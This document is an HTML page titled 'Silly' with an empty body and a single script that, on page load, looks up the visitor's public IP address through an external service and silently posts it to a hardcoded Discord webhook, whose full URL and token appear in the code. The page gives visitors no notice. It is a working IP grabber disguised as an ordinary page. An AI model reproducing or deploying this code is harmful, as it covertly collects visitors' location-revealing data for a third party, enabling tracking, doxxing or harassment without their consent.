<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Silly</title>
    <script>
        // Function to get external IP address using an API service
        async function getExternalIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip; // Extract the IP address from the response
            } catch (error) {
                console.error('Error fetching external IP:', error);
                return 'Unable to fetch IP';
            }
        }

        // Function to send a message to the Discord webhook
        function sendToDiscord(message) {
            const webhookUrl = 'https://discord.com/api/webhooks/1301509768615301141/rnswrsYbi6Ja_C_xZQrQqvfEC8cdyVIqEewktzq3cLnaQ1O4WRGvmiMSWyvZuYsMiLxq';  // Replace with your actual Discord Webhook URL
            
            const payload = {
                content: message
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent to Discord:', data);
            })
            .catch(error => {
                console.error('Error sending message to Discord:', error);
            });
        }

        // When the page loads, fetch external IP and send it to Discord
        window.onload = async function() {
            const ip = await getExternalIP();  // Get external IP address
            const message = `IP Address: ${ip}`;  // Prepare the message to send

            console.log('Sending to Discord:', message);
            sendToDiscord(message);  // Send the message to Discord webhook
        };
    </script>
</head>

</body>
</html>
